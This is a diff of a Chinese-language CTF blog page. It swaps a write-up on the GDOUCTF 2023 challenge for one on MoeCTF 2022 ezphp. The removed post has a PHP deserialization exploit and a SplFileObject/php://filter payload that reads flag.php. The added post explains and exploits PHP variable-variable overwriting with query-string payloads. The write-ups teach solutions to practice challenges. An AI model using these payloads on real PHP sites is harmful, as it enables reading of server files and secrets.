@@ -20,22 +20,22 @@
     var CONFIG = {"hostname":"xtyy0510.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="[GDOUCTF 2023]反方向的钟题目链接https:&#x2F;&#x2F;www.nssctf.cn&#x2F;problem&#x2F;3723">
+  <meta name="description" content="[MoeCTF 2022]ezphp记一次php变量间接引用 题目来源：[MoeCTF 2022]ezphp | NSSCTF">
 <meta property="og:type" content="article">
-<meta property="og:title" content="[GDOUCTF 2023]反方向的钟">
-<meta property="og:url" content="https://xtyy0510.github.io/2024/11/05/GDOUCTF-2023-%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F/index.html">
+<meta property="og:title" content="php变量间接引用">
+<meta property="og:url" content="https://xtyy0510.github.io/2024/11/11/php%E5%8F%98%E9%87%8F%E9%97%B4%E6%8E%A5%E5%BC%95%E7%94%A8/index.html">
 <meta property="og:site_name" content="xtyy&#39;s blog">
-<meta property="og:description" content="[GDOUCTF 2023]反方向的钟题目链接https:&#x2F;&#x2F;www.nssctf.cn&#x2F;problem&#x2F;3723">
+<meta property="og:description" content="[MoeCTF 2022]ezphp记一次php变量间接引用 题目来源：[MoeCTF 2022]ezphp | NSSCTF">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://xtyy0510.github.io/2024/11/05/GDOUCTF-2023-%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F/1.png">
-<meta property="article:published_time" content="2024-11-05T12:02:07.000Z">
-<meta property="article:modified_time" content="2024-11-09T08:45:10.852Z">
+<meta property="og:image" content="https://xtyy0510.github.io/2024/11/11/php%E5%8F%98%E9%87%8F%E9%97%B4%E6%8E%A5%E5%BC%95%E7%94%A8/1.png">
+<meta property="article:published_time" content="2024-11-11T12:14:08.000Z">
+<meta property="article:modified_time" content="2024-11-11T12:29:46.928Z">
 <meta property="article:author" content="星潭月音">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://xtyy0510.github.io/2024/11/05/GDOUCTF-2023-%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F/1.png">
+<meta name="twitter:image" content="https://xtyy0510.github.io/2024/11/11/php%E5%8F%98%E9%87%8F%E9%97%B4%E6%8E%A5%E5%BC%95%E7%94%A8/1.png">
 
-<link rel="canonical" href="https://xtyy0510.github.io/2024/11/05/GDOUCTF-2023-%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F/">
+<link rel="canonical" href="https://xtyy0510.github.io/2024/11/11/php%E5%8F%98%E9%87%8F%E9%97%B4%E6%8E%A5%E5%BC%95%E7%94%A8/">
 
 
 <script id="page-configurations">
@@ -48,7 +48,7 @@
   };
 </script>
 
-  <title>[GDOUCTF 2023]反方向的钟 | xtyy's blog</title>
+  <title>php变量间接引用 | xtyy's blog</title>
   
 
 
@@ -191,7 +191,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://xtyy0510.github.io/2024/11/05/GDOUCTF-2023-%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F/">
+    <link itemprop="mainEntityOfPage" href="https://xtyy0510.github.io/2024/11/11/php%E5%8F%98%E9%87%8F%E9%97%B4%E6%8E%A5%E5%BC%95%E7%94%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -204,7 +204,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          [GDOUCTF 2023]反方向的钟
+          php变量间接引用
         </h1>
 
         <div class="post-meta">
@@ -216,16 +216,10 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2024-11-05 20:02:07" itemprop="dateCreated datePublished" datetime="2024-11-05T20:02:07+08:00">2024-11-05</time>
+              <time title="创建时间：2024-11-11 20:14:08 / 修改时间：20:29:46" itemprop="dateCreated datePublished" datetime="2024-11-11T20:14:08+08:00">2024-11-11</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-11-09 16:45:10" itemprop="dateModified" datetime="2024-11-09T16:45:10+08:00">2024-11-09</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -249,7 +243,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>956</span>
+              <span>1.2k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -268,25 +262,32 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="GDOUCTF-2023-反方向的钟"><a href="#GDOUCTF-2023-反方向的钟" class="headerlink" title="[GDOUCTF 2023]反方向的钟"></a>[GDOUCTF 2023]反方向的钟</h1><p>题目链接<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3723">https://www.nssctf.cn/problem/3723</a></p>
+        <h2 id="MoeCTF-2022-ezphp"><a href="#MoeCTF-2022-ezphp" class="headerlink" title="[MoeCTF 2022]ezphp"></a>[MoeCTF 2022]ezphp</h2><p>记一次php变量间接引用</p>
+<p>题目来源：[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3348">MoeCTF 2022]ezphp | NSSCTF</a></p>
 <span id="more"></span>
-<p>拿到题目，先代码审计</p>
-<p><img src="/2024/11/05/GDOUCTF-2023-%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F/1.png" alt="图片1">​</p>
-<p>看了一下是反序列化攻击</p>
-<p>直接分析代码，满足</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;headmaster == <span class="string">&#x27;ong&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
-<p>语句</p>
-<p>执行原生类，然后利用wakeup触发函数，到这里执行，直接贴exp</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$salary</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classroom</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;one class&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$leader</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">school</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$department</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$headmaster</span>=<span class="string">&#x27;ong&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">teacher</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span>-&gt;name=<span class="string">&#x27;ing&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span>-&gt;rank=<span class="string">&#x27;department&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p2</span>=<span class="keyword">new</span> <span class="title function_ invoke__">classroom</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$p2</span>-&gt;leader = <span class="variable">$p1</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p3</span>= <span class="keyword">new</span> <span class="title function_ invoke__">school</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$p3</span>-&gt;department = <span class="variable">$p2</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$p3</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;source.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;xxxxxxxx&#x27;</span>;</span><br><span class="line"><span class="variable">$giveme</span> = <span class="string">&#x27;can can need flag!&#x27;</span>;</span><br><span class="line"><span class="variable">$getout</span> = <span class="string">&#x27;No! flag.Try again. Come on!&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$giveme</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$getout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;the flag is : &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>然后传入原生类</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="built_in">SplFileObject</span>&amp;b=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+<p>代码审计一下，必须以GET或POST传入一个flag参数，才能绕过第一个exit，如果flag参数的值也同为flag，那会被第二个exit终止，如果flag参数不为flag的话，后面flag的值就会被新的值覆盖掉</p>
+<p>分析一下两个foreach循环：形如传参name&#x3D;xtyy，那么就会使$key&#x3D;name $value&#x3D;xtyy</p>
+<p>重点在于第二个foreach循环</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>这里已经给出flag位置，SplFileObject只能读取单行，所以用伪协议读取全文，解密拿到flag</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCiRmbGFnID0gIk5TU0NURnszMjVjODZhNS01M2VjLTRkMzctYTU4OC02MWRiOTVjYzg1NGR9IjsNCj8+DQo=</span><br></pre></td></tr></table></figure>
+<p>这里是变量的间接引用，相当于把$key替换成上面的name，也就会变成$name</p>
+<p>也就是说，传入的?name&#x3D;xtyy就会变成$name&#x3D;$xtyy的传参，</p>
+<p>如果这里传入a&#x3D;flag，就会把$flag的值储存在变量$a中，后面再让$flag&#x3D;$a，就可以把flag原本的值拿回来</p>
+<p>payload：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=flag&amp;flag=a</span><br></pre></td></tr></table></figure>
 
-<p>$flag &#x3D; “NSSCTF{325c86a5-53ec-4d37-a588-61db95cc854d}”;</p>
+<p>其实这相当于</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当然如果传参：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=flag&amp;b=a&amp;flag=b</span><br></pre></td></tr></table></figure>
+
+<p>只要能在最后把变量flag的值赋回来，都是可以的</p>
+<p>成功的拿到了flag</p>
+<p><img src="/2024/11/11/php%E5%8F%98%E9%87%8F%E9%97%B4%E6%8E%A5%E5%BC%95%E7%94%A8/1.png" alt="image"></p>
 
     </div>
 
@@ -304,11 +305,11 @@
 
         
     <div class="post-nav">
-      <div class="post-nav-item"></div>
       <div class="post-nav-item">
-    <a href="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/" rel="next" title="2024安徽省分布式">
-      2024安徽省分布式 <i class="fa fa-chevron-right"></i>
+    <a href="/2024/11/06/SICTF-2024-round4/" rel="prev" title="SICTF 2024">
+      <i class="fa fa-chevron-left"></i> SICTF 2024
     </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -367,7 +368,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#GDOUCTF-2023-%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F"><span class="nav-number">1.</span> <span class="nav-text">[GDOUCTF 2023]反方向的钟</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#MoeCTF-2022-ezphp"><span class="nav-number">1.</span> <span class="nav-text">[MoeCTF 2022]ezphp</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
